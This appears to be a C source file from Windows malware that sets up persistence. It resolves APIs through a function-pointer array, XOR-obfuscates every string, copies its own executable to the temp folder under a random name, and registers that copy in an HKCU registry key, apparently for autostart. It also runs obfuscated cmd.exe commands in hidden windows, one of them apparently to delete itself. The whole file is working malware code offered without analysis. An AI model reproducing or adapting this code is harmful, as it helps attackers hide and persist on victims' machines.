#include "Persistent.h"
#include "Crypto.h"
#include "wbemcli.h"
#include "oleauto.h"

LPCSTR tempFile_path;

extern FARPROC APIArray[52];

MemeCopyFileA TempCopyFileA1;
MemeGetTempPathA TempGetTempPathA1;
MemeGetModuleFileNameA TempGetModuleFileNameA1;
MemeRegOpenKeyExA TempRegOpenKeyExA1;
MemeRegSetKeyValueA TempRegSetKeyValueA1;
MemeShellExecuteA TempShellExecuteA1;
MemeCryptReleaseContext TempCryptReleaseContext1;
MemeCryptGenRandom TempCryptGenRandom1;

void populateApiPersist() {
	TempCopyFileA1 = (MemeCopyFileA)APIArray[15];
	TempGetTempPathA1 = (MemeGetTempPathA)APIArray[3];
	TempGetModuleFileNameA1 = (MemeGetModuleFileNameA)APIArray[24];
	TempRegOpenKeyExA1 = (MemeRegOpenKeyExA)APIArray[39];
	TempRegSetKeyValueA1 = (MemeRegSetKeyValueA)APIArray[40];
	TempShellExecuteA1 = (MemeShellExecuteA)APIArray[49];
	TempCryptReleaseContext1 = (MemeCryptReleaseContext)APIArray[41];
	TempCryptGenRandom1 = (MemeCryptGenRandom)APIArray[37];
}

void resolveStringPersist(BYTE* buffer, BYTE* key, int size) {
	for (int i = 0; i < size; i++) {
		buffer[i] ^= 0xFF;
		buffer[i] ^= key[i % 5];
	}
}

int createTemp(HCRYPTPROV hCryptProv) {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}

	BYTE ext_key[5] = { 130, 44, 202, 212, 100 };
	BYTE ext_str[5] = { 83, 182, 77, 78, 155 };
	resolveStringPersist(ext_str, ext_key, 5);

	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	BYTE* randomBuffer = (BYTE*)calloc(16, 1);

	int return_val = -1;
	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpCurrentFileName) {
		goto CLEANUP;
	}
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!randomBuffer) {
		goto CLEANUP;
	}

	if (!TempGetTempPathA1(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	if (!TempGetModuleFileNameA1(0, lpCurrentFileName, MAX_PATH)) {
		goto CLEANUP;
	}

	if (!TempCryptGenRandom1(hCryptProv, 15, randomBuffer)) {
		goto CLEANUP;
	}

	for (int i = 0; i < 15; i++) {
		randomBuffer[i] = (randomBuffer[i] % 26) + 65;

	}
	randomBuffer[15] = 0;
	strcat(lpTemp, (LPSTR)randomBuffer);
	strcat(lpTemp, (LPCSTR)ext_str);

	if (!TempCopyFileA1(lpCurrentFileName, lpTemp, TRUE)) {
		goto CLEANUP;
	}

	return_val = 0;
	tempFile_path = lpTemp;
CLEANUP:
	if (randomBuffer) {
		free(randomBuffer);
	}
	if (lpCurrentFileName) {
		free(lpCurrentFileName);
	}
	return return_val;
}

int persistRegistry() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	HKEY hKey;
	BYTE registry_key[5] = { 79, 143, 84, 27, 85 };
	BYTE registry_str[46] = { 227, 63, 237, 176, 253, 241, 34, 238, 184, 231, 217, 19, 217, 139, 217, 223, 22, 223, 184, 253, 217, 30, 207, 139, 221, 195, 44, 232, 145, 216, 194, 21, 197, 144, 252, 213, 2, 216, 141, 197, 222, 44, 249, 145, 196, 176 };
	resolveStringPersist(registry_str, registry_key, 46);

	if (TempRegOpenKeyExA1(HKEY_CURRENT_USER, (LPCSTR)registry_str, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		return -1;
	}

	BYTE fileName_key[5] = { 108, 194, 42, 43, 219 };
	BYTE fileName_str[13] = { 222, 88, 184, 177, 4, 208, 79, 172, 164, 80, 252, 79, 213 };
	resolveStringPersist(fileName_str, fileName_key, 13);

	if (TempRegSetKeyValueA1(hKey, NULL, (LPCSTR)fileName_str, REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
		return -1;
	}
	return 0;

}

int environmentSetup() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	BYTE command_key[5] = { 88, 102, 219, 121, 236 };
	BYTE command_str[169] = { 136, 218, 4, 241, 126, 206, 250, 4, 213, 91, 230, 221, 107, 209, 80, 232, 201, 125, 166, 87, 226, 213, 97, 210, 86, 135, 162, 4, 241, 113, 198, 253, 73, 239, 125, 135, 221, 97, 202, 86, 243, 220, 4, 213, 74, 244, 205, 97, 203, 64, 243, 216, 112, 195, 81, 230, 218, 111, 211, 67, 135, 162, 4, 228, 112, 195, 252, 64, 239, 103, 137, 252, 92, 227, 51, 136, 234, 65, 242, 51, 195, 252, 66, 231, 102, 203, 237, 4, 228, 124, 200, 237, 87, 242, 114, 211, 236, 87, 246, 124, 203, 240, 71, 255, 51, 206, 254, 74, 233, 97, 194, 248, 72, 234, 117, 198, 240, 72, 243, 97, 194, 234, 4, 189, 51, 197, 250, 64, 227, 119, 206, 237, 10, 227, 107, 194, 185, 11, 245, 118, 211, 185, 64, 227, 117, 198, 236, 72, 242, 51, 213, 252, 71, 233, 101, 194, 235, 93, 227, 125, 198, 251, 72, 227, 119, 135, 215, 75, 134 };
	resolveStringPersist(command_str, command_key, 169);

	BYTE open_key[5] = { 1, 101, 134, 78, 79 };
	BYTE open_str[5] = { 145, 234, 28, 223, 176 };
	resolveStringPersist(open_str, open_key, 5);

	BYTE cmd_exe_key[5] = { 34, 202, 156, 136, 17 };
	BYTE cmd_exe_str[8] = { 190, 88, 7, 89, 139, 165, 80, 99 };
	resolveStringPersist(cmd_exe_str, cmd_exe_key, 8);


	if ((int)TempShellExecuteA1(0, (LPCSTR)open_str, (LPCSTR)cmd_exe_str, (LPCSTR)command_str, 0, SW_HIDE) <= 32) {
		return -1;
	}
	return 0;
}

int mainPersist() {
	HCRYPTPROV hCryptProv;
	if (!TempCopyFileA1) {
		populateApiPersist();
	}


	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}
	if (createTemp(hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (persistRegistry() == -1) {
		goto CLEANUP;
	}

	if (environmentSetup() == -1) {

		goto CLEANUP;
	}

CLEANUP:
	if (hCryptProv) {
		TempCryptReleaseContext1(hCryptProv, 0);
	}
	return 0;
}

void persistCleanUp() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	if (tempFile_path) {
		free((void*)tempFile_path);
	}

	BYTE command_key[5] = { 101, 231, 137, 173, 84 };
	BYTE command_str[59] = { 181, 91, 86, 112, 219, 245, 111, 19, 32, 216, 242, 125, 26, 62, 139, 183, 123, 25, 63, 198, 251, 118, 18, 114, 248, 238, 121, 4, 38, 134, 201, 116, 19, 55, 219, 186, 53, 5, 114, 154, 186, 35, 86, 0, 206, 247, 119, 0, 55, 134, 211, 108, 19, 63, 139, 191, 107, 84, 82 };
	resolveStringPersist(command_str, command_key, 59);

	BYTE open_key[5] = { 209, 243, 126, 35, 90 };
	BYTE open_str[5] = { 65, 124, 228, 178, 165 };
	resolveStringPersist(open_str, open_key, 5);

	BYTE cmd_exe_key[5] = { 197, 47, 184, 0, 153 };
	BYTE cmd_exe_str[8] = { 89, 189, 35, 209, 3, 66, 181, 71 };
	resolveStringPersist(cmd_exe_str, cmd_exe_key, 8);


	LPSTR commandBuffer = (LPSTR)calloc(300, 1);

	if (!commandBuffer) {
		return;
	}

	LPSTR fileNameBuffer = (LPSTR)calloc(260, 1); // MAXPATH

	if (!fileNameBuffer) {
		return;
	}
	TempGetModuleFileNameA1(NULL, fileNameBuffer, 260);

	sprintf(commandBuffer, (LPCSTR)command_str, fileNameBuffer);
	TempShellExecuteA1(0, (LPCSTR)open_str, (LPCSTR)cmd_exe_str, commandBuffer, 0, SW_HIDE);
}